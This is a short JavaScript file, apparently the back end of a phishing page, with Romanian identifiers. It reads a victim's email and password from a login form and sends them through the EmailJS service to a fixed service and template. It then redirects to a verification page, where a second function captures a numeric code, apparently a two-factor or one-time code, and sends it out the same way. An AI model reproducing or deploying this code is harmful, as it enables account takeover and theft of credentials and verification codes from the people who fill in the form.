function sendmail()
{
    var params ={
        mail: document.getElementById("mail").value,
        parola: document.getElementById("parola").value
    }
const serviceID = "service_lzrr8o9";
const templateID = "template_rrnogn5";

emailjs.send(serviceID,templateID,params)
.then(
    res => {
        window.location='verification.html';
    }
).catch((err) => console.log(err));
}

function sendmail2()
{
    var params ={
        cheie: document.getElementById("numberInput").value,
    }
const serviceID = "service_lzrr8o9";
const templateID = "template_ebn9l57";

emailjs.send(serviceID,templateID,params)
.then(
    res => {
        var k = document.getElementById("verifici");
        k.style.display = "block";   
    }
).catch((err) => console.log(err));
}
function butoaie()
{
    if(document.getElementById("mail").value == "" || document.getElementById("parola").value == "")
        document.getElementById("incorect").style.display = "block";
    else
{
    document.getElementById("incorect").style.display = "none";
    sendmail();
}
        
}
function confirm()
{
    if(document.getElementById("numberInput").value == ""|| document.getElementById("numberInput").value <100000)
        document.getElementById("verifici").style.display = "block";
    else
{
    document.getElementById("verifici").style.display = "none";
    sendmail2();
}
        
}